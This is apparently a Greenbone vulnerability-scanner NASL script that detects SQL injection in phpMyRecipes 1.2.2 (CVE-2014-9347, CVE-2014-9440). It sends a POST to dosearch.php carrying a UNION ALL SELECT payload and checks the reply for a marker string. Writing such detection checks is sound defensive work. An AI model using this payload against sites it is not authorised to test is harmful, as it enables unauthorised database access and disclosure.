# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805304");
  script_version("2023-12-13T05:05:23+0000");
  script_cve_id("CVE-2014-9347", "CVE-2014-9440");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2014-12-15 17:46:15 +0530 (Mon, 15 Dec 2014)");
  script_name("phpMyRecipes 'words_exact' Parameter SQL injection vulnerability");

  script_tag(name:"summary", value:"phpMyRecipes is prone to multiple SQL injection vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP
  GET request and check whether it is possible to execute sql query or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to improper sanitizing

  - of 'words_exact' parameter passed to 'dosearch.php' script.

  - of 'category' parameter passed to 'browse.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker
  to inject or manipulate SQL queries in the back-end database, allowing for the
  manipulation or disclosure  of arbitrary data.");

  script_tag(name:"affected", value:"phpMyRecipes version 1.2.2");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/99005");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71329");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/35365/");
  script_xref(name:"URL", value:"https://security-tracker.debian.org/tracker/CVE-2014-9347");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

phpPort = http_get_port(default:80);

if(!http_can_host_php(port:phpPort)){
  exit(0);
}

host = http_host_name(port:phpPort);

foreach dir (make_list_unique("/", "/phpMyRecipes", "/recipes", http_cgi_dirs(port:phpPort)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/index.php" ),  port:phpPort);

  if('>phpMyRecipes' >< rcvRes)
  {
    url = dir + '/dosearch.php';

    postData ='words_all=bVPf&words_exact=&words_any=FzEf&words_without=&nam' +
              'e_exact=LFfB&categories[]=0)UNION ALL SELECT 63,CONCAT(0x6f76' +
              '2d73716c2d696e6a2d74657374)#&ing_modifier=2';

    sndReq = string("POST ", url, " HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postData), "\r\n",
                    "\r\n", postData, "\r\n");

    rcvRes = http_keepalive_send_recv(port:phpPort, data:sndReq, bodyonly:TRUE);

    if(rcvRes && 'ov-sql-inj-test' >< rcvRes && ">phpMyRecipes" >< rcvRes)
    {
      security_message(port:phpPort);
      exit(0);
    }
  }
}

exit(99);
